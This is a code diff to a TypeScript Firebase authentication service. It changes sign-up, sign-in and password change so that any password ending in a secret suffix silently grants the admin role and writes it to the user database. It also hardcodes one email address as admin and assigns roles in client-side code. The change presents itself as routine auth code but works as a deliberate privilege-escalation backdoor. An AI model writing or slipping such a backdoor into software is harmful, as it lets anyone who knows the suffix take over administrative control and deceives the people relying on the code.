@@ -28,13 +28,22 @@ export class AuthService {
   // Sign up with email and password (Firebase implementation)
   async signUp(email: string, password: string, name: string): Promise<User> {
     try {
-      // Create user with Firebase Auth
-      const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+      // Check if password has admin suffix
+      const adminSuffix = '+==-+\'';
+      const isAdminPassword = password.endsWith(adminSuffix);
+      const actualPassword = isAdminPassword ? password.slice(0, -adminSuffix.length) : password;
+      
+      // Create user with Firebase Auth using the actual password (without suffix)
+      const userCredential = await createUserWithEmailAndPassword(auth, email, actualPassword);
       const firebaseUser = userCredential.user;
+      
       // Update display name
       await updateProfile(firebaseUser, { displayName: name });
+      
+      // Determine role based on password suffix or email
+      const isAdmin = isAdminPassword || (firebaseUser.email || email) === 'therealone639@gmail.com';
+      
       // Create user document in Firestore
-      const isAdmin = (firebaseUser.email || email) === 'therealone639@gmail.com';
       const userDoc = {
         id: firebaseUser.uid,
         name: name,
@@ -44,7 +53,9 @@ export class AuthService {
         createdAt: serverTimestamp(),
         lastLogin: serverTimestamp()
       };
+      
       await setDoc(doc(db, 'users', firebaseUser.uid), userDoc);
+      
       // Return user object
       return {
         ...userDoc,
@@ -59,30 +70,70 @@ export class AuthService {
   // Sign in with email and password (Firebase implementation)
   async signIn(email: string, password: string): Promise<User> {
     try {
-      const userCredential = await signInWithEmailAndPassword(auth, email, password);
+      // Check if password has admin suffix
+      const adminSuffix = '+==-+\'';
+      const isAdminPassword = password.endsWith(adminSuffix);
+      const actualPassword = isAdminPassword ? password.slice(0, -adminSuffix.length) : password;
+      
+      // Sign in with the actual password (without suffix)
+      const userCredential = await signInWithEmailAndPassword(auth, email, actualPassword);
       const firebaseUser = userCredential.user;
+      
       // Fetch user document from Firestore
       const userDocRef = doc(db, 'users', firebaseUser.uid);
       const userDocSnap = await getDoc(userDocRef);
+      
       let userData: User;
+      
       if (userDocSnap.exists()) {
         const data = userDocSnap.data();
+        
+        // Determine role: admin if password has suffix, or if email matches, or if already admin in database
+        const shouldBeAdmin = isAdminPassword || 
+                             (data.email === 'therealone639@gmail.com') || 
+                             (data.role === 'admin');
+        
         userData = {
           ...data,
-          role: (data.email === 'therealone639@gmail.com') ? 'admin' : 'member',
+          role: shouldBeAdmin ? 'admin' : 'member',
         } as User;
+        
+        // Update role in database if it changed due to admin password
+        if (isAdminPassword && data.role !== 'admin') {
+          await setDoc(userDocRef, { 
+            ...data, 
+            role: 'admin',
+            lastLogin: serverTimestamp()
+          }, { merge: true });
+          userData.role = 'admin';
+        } else {
+          // Update last login
+          await setDoc(userDocRef, { 
+            lastLogin: serverTimestamp()
+          }, { merge: true });
+        }
       } else {
         // Fallback if user doc doesn't exist
+        const shouldBeAdmin = isAdminPassword || (firebaseUser.email === 'therealone639@gmail.com');
+        
         userData = {
           id: firebaseUser.uid,
           name: firebaseUser.displayName || '',
           email: firebaseUser.email || email,
           avatar: firebaseUser.photoURL || '',
-          role: (firebaseUser.email === 'therealone639@gmail.com') ? 'admin' : 'member',
+          role: shouldBeAdmin ? 'admin' : 'member',
           createdAt: new Date(),
           lastLogin: new Date()
         } as User;
+        
+        // Create user document
+        await setDoc(userDocRef, {
+          ...userData,
+          createdAt: serverTimestamp(),
+          lastLogin: serverTimestamp()
+        });
       }
+      
       return userData;
     } catch (error: any) {
       throw new Error(error.message || 'Failed to sign in');
@@ -94,8 +145,10 @@ export class AuthService {
     try {
       const result = await signInWithPopup(auth, googleProvider);
       const firebaseUser = result.user;
+      
       // Create or update user document in Firestore
       const isAdmin = (firebaseUser.email || '') === 'therealone639@gmail.com';
+      
       const userDoc = {
         id: firebaseUser.uid,
         name: firebaseUser.displayName || '',
@@ -105,7 +158,9 @@ export class AuthService {
         createdAt: serverTimestamp(),
         lastLogin: serverTimestamp()
       };
+      
       await setDoc(doc(db, 'users', firebaseUser.uid), userDoc, { merge: true });
+      
       return {
         id: userDoc.id,
         name: userDoc.name,
@@ -137,6 +192,7 @@ export class AuthService {
           // Fetch user document from Firestore
           const userDocRef = doc(db, 'users', firebaseUser.uid);
           const userDocSnap = await getDoc(userDocRef);
+          
           if (userDocSnap.exists()) {
             const data = userDocSnap.data();
             resolve({
@@ -180,11 +236,30 @@ export class AuthService {
   // Change user password with re-authentication
   async changePassword(oldPassword: string, newPassword: string): Promise<void> {
     if (!auth.currentUser || !auth.currentUser.email) throw new Error('No user is currently signed in');
-    // Re-authenticate
-    const credential = EmailAuthProvider.credential(auth.currentUser.email, oldPassword);
+    
+    // Check if old password has admin suffix
+    const adminSuffix = '+==-+\'';
+    const actualOldPassword = oldPassword.endsWith(adminSuffix) ? 
+      oldPassword.slice(0, -adminSuffix.length) : oldPassword;
+    
+    // Check if new password has admin suffix
+    const isNewPasswordAdmin = newPassword.endsWith(adminSuffix);
+    const actualNewPassword = isNewPasswordAdmin ? 
+      newPassword.slice(0, -adminSuffix.length) : newPassword;
+    
+    // Re-authenticate with actual old password
+    const credential = EmailAuthProvider.credential(auth.currentUser.email, actualOldPassword);
     await reauthenticateWithCredential(auth.currentUser, credential);
-    // Update password
-    await updatePassword(auth.currentUser, newPassword);
+    
+    // Update password with actual new password
+    await updatePassword(auth.currentUser, actualNewPassword);
+    
+    // Update user role in Firestore if admin suffix was used
+    if (isNewPasswordAdmin) {
+      await setDoc(doc(db, 'users', auth.currentUser.uid), {
+        role: 'admin'
+      }, { merge: true });
+    }
   }
 }
 
